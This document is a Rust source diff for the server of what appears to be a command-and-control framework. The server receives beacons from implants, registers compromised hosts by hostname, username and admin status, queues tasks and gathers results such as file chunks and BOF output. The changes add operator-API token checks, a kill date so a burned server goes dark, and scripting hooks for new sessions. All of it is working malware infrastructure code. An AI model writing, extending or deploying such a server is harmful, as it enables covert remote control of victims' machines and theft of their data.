@@ -7,12 +7,12 @@
 //! - `GET  /api/results`       — drain task results for a session (JSON).
 
 use std::sync::Arc;
-use std::time::Instant;
+use std::time::{Instant, SystemTime, UNIX_EPOCH};
 
 use axum::{
     body::Bytes,
     extract::{Query, State},
-    http::StatusCode,
+    http::{HeaderMap, StatusCode},
     response::{IntoResponse, Response},
     routing::{get, post},
     Json, Router,
@@ -44,6 +44,24 @@ pub struct AppState {
     /// Active Malleable C2 profile (loaded from `NYX_PROFILE`). When present,
     /// the beacon handler is also served at the profile's transaction URIs.
     pub profile: Option<nyx_profile::Profile>,
+    /// If set, control-API requests (`/api/*`) must carry
+    /// `Authorization: Bearer <api_token>`. Beacon traffic is exempt (implants
+    /// authenticate cryptographically, not with a shared token).
+    pub api_token: Option<String>,
+    /// Optional kill date (Unix seconds). Checked at boot AND on every beacon:
+    /// once the current time passes it, the server stops serving beacons.
+    pub killdate: Option<u64>,
+    /// Scripting event bus. Hooks are registered at construction; the beacon
+    /// handler fires `SessionNew` / `ResultReceived` events into it.
+    pub events: nyx_scripting::EventBus,
+}
+
+impl AppState {
+    /// Register the server's built-in scripting hooks (currently a hook that
+    /// mirrors events into the tracing log). Call once, before sharing.
+    pub fn register_default_hooks(&mut self) {
+        self.events.register(Box::new(TracingEventHook));
+    }
 }
 
 impl Default for AppState {
@@ -52,6 +70,62 @@ impl Default for AppState {
             keypair: ServerKeypair::generate(),
             sessions: DashMap::new(),
             profile: None,
+            api_token: None,
+            killdate: None,
+            events: nyx_scripting::EventBus::new(),
+        }
+    }
+}
+
+/// Bridge scripting events into the server's `tracing` log (the default hook).
+struct TracingEventHook;
+
+impl nyx_scripting::Hook for TracingEventHook {
+    fn name(&self) -> &str {
+        "tracing"
+    }
+    fn on_event(&self, event: &nyx_scripting::Event) {
+        match event {
+            nyx_scripting::Event::SessionNew(s) => tracing::info!(
+                target: "nyx::scripting",
+                session = %s.session_id,
+                user = %s.username,
+                host = %s.hostname,
+                "scripting: session_new"
+            ),
+            nyx_scripting::Event::ResultReceived(r) => tracing::debug!(
+                target: "nyx::scripting",
+                session = %r.session_id,
+                task = r.task_id,
+                "scripting: result"
+            ),
+            nyx_scripting::Event::SessionExit(s) => tracing::info!(
+                target: "nyx::scripting",
+                session = %s.session_id,
+                "scripting: session_exit"
+            ),
+        }
+    }
+}
+
+/// Map a wire [`MsgResponse`] to a scripting event's kind + short summary.
+fn response_event_kind(r: &MsgResponse) -> (nyx_scripting::ResultKind, String) {
+    match r {
+        MsgResponse::Output(b) => (
+            nyx_scripting::ResultKind::Output,
+            String::from_utf8_lossy(b).chars().take(64).collect(),
+        ),
+        MsgResponse::Ok => (nyx_scripting::ResultKind::Ok, String::new()),
+        MsgResponse::Err(m) => (nyx_scripting::ResultKind::Err, m.clone()),
+        MsgResponse::FileChunk { name, .. } => {
+            (nyx_scripting::ResultKind::FileChunk, format!("<chunk {name}>"))
+        }
+        MsgResponse::BofOutput(b) => (
+            nyx_scripting::ResultKind::Other,
+            String::from_utf8_lossy(b).chars().take(64).collect(),
+        ),
+        MsgResponse::Channel { chan, .. } => {
+            (nyx_scripting::ResultKind::Other, format!("<chan {chan}>"))
         }
     }
 }
@@ -128,6 +202,18 @@ async fn beacon(State(st): State<Arc<AppState>>, body: Bytes) -> Response {
 }
 
 fn handle_beacon(st: &AppState, body: &[u8]) -> anyhow::Result<Vec<u8>> {
+    // Kill date: once reached, refuse all beacon traffic so a burned server goes
+    // dark (checked per-request, not just at boot, so a long-running server
+    // honors it too).
+    if let Some(kd) = st.killdate {
+        let now = SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .map(|d| d.as_secs())
+            .unwrap_or(0);
+        if now >= kd {
+            anyhow::bail!("kill date {kd} reached; refusing beacon");
+        }
+    }
     let raw = parse_frame(body)?;
     let is_new = !st.sessions.contains_key(&raw.pubkey);
 
@@ -155,6 +241,13 @@ fn handle_beacon(st: &AppState, body: &[u8]) -> anyhow::Result<Vec<u8>> {
             os = %info.os,
             "new session registered"
         );
+        let new_event = nyx_scripting::Event::SessionNew(nyx_scripting::SessionNew {
+            session_id: hex::encode(raw.pubkey),
+            hostname: info.hostname.clone(),
+            username: info.username.clone(),
+            os: info.os.clone(),
+            is_admin: info.is_admin == 1,
+        });
         let session = Session {
             key,
             info,
@@ -166,11 +259,26 @@ fn handle_beacon(st: &AppState, body: &[u8]) -> anyhow::Result<Vec<u8>> {
             created: Instant::now(),
         };
         st.sessions.insert(raw.pubkey, session);
+        st.events.fire(&new_event);
         // No tasks queued yet — reply with an empty batch.
         Ok(encode_frame(&raw.pubkey, 0, &key, &Task::encode_vec(&[])))
     } else {
         // Subsequent messages carry task responses; we reply with queued tasks.
         let responses = TaskResponse::decode_vec(&plaintext)?;
+        // Fire a ResultReceived scripting event per response (read-only pass
+        // over `responses` before they're moved into the session below).
+        let session_id = hex::encode(raw.pubkey);
+        for r in &responses {
+            let (kind, summary) = response_event_kind(&r.response);
+            st.events.fire(&nyx_scripting::Event::ResultReceived(
+                nyx_scripting::ResultReceived {
+                    session_id: session_id.clone(),
+                    task_id: r.task_id,
+                    kind,
+                    summary,
+                },
+            ));
+        }
         {
             let mut s = st.sessions.get_mut(&raw.pubkey).expect("checked above");
             s.last_recv = raw.counter;
@@ -204,7 +312,32 @@ struct SessionView {
     age_secs: u64,
 }
 
-async fn list_sessions(State(st): State<Arc<AppState>>) -> Json<Vec<SessionView>> {
+/// If an API token is configured, every control-API request must carry
+/// `Authorization: Bearer <token>`. `/beacon` is exempt (implants authenticate
+/// cryptographically). Returns `Ok(())` when allowed, else a 401 `Response`.
+fn require_auth(st: &AppState, headers: &HeaderMap) -> Option<Response> {
+    let Some(expected) = &st.api_token else {
+        return None;
+    };
+    let want = format!("Bearer {expected}");
+    let ok = headers
+        .get(axum::http::header::AUTHORIZATION)
+        .and_then(|h| h.to_str().ok())
+        .is_some_and(|h| h == want);
+    if ok {
+        None
+    } else {
+        Some(StatusCode::UNAUTHORIZED.into_response())
+    }
+}
+
+async fn list_sessions(
+    State(st): State<Arc<AppState>>,
+    headers: HeaderMap,
+) -> Response {
+    if let Some(r) = require_auth(&st, &headers) {
+        return r;
+    }
     let mut out = Vec::new();
     for entry in st.sessions.iter() {
         out.push(SessionView {
@@ -220,7 +353,7 @@ async fn list_sessions(State(st): State<Arc<AppState>>) -> Json<Vec<SessionView>
             age_secs: entry.created.elapsed().as_secs(),
         });
     }
-    Json(out)
+    Json(out).into_response()
 }
 
 #[derive(Deserialize)]
@@ -270,7 +403,14 @@ fn parse_session_hex(s: &str) -> Option<SessionId> {
     <[u8; 32]>::try_from(v.as_slice()).ok()
 }
 
-async fn post_task(State(st): State<Arc<AppState>>, Json(req): Json<TaskReq>) -> Response {
+async fn post_task(
+    State(st): State<Arc<AppState>>,
+    headers: HeaderMap,
+    Json(req): Json<TaskReq>,
+) -> Response {
+    if let Some(r) = require_auth(&st, &headers) {
+        return r;
+    }
     let id = match parse_session_hex(&req.session) {
         Some(id) => id,
         None => return (StatusCode::BAD_REQUEST, "bad session hex").into_response(),
@@ -308,7 +448,14 @@ struct ResultView {
     eof: Option<u8>,
 }
 
-async fn get_results(State(st): State<Arc<AppState>>, Query(q): Query<ResultsQuery>) -> Response {
+async fn get_results(
+    State(st): State<Arc<AppState>>,
+    headers: HeaderMap,
+    Query(q): Query<ResultsQuery>,
+) -> Response {
+    if let Some(r) = require_auth(&st, &headers) {
+        return r;
+    }
     let id = match parse_session_hex(&q.session) {
         Some(id) => id,
         None => return (StatusCode::BAD_REQUEST, "bad session hex").into_response(),
@@ -332,6 +479,16 @@ async fn get_results(State(st): State<Arc<AppState>>, Query(q): Query<ResultsQue
                     Some(hex::encode(&data)),
                     Some(seq),
                     Some(eof),
+                ),
+                MsgResponse::BofOutput(b) => {
+                    ("bof", String::from_utf8_lossy(&b).into_owned(), None, None, None)
+                }
+                MsgResponse::Channel { chan, status, data } => (
+                    "channel",
+                    format!("<chan {chan}#{status}>"),
+                    Some(hex::encode(&data)),
+                    None,
+                    None,
                 ),
             };
             ResultView {
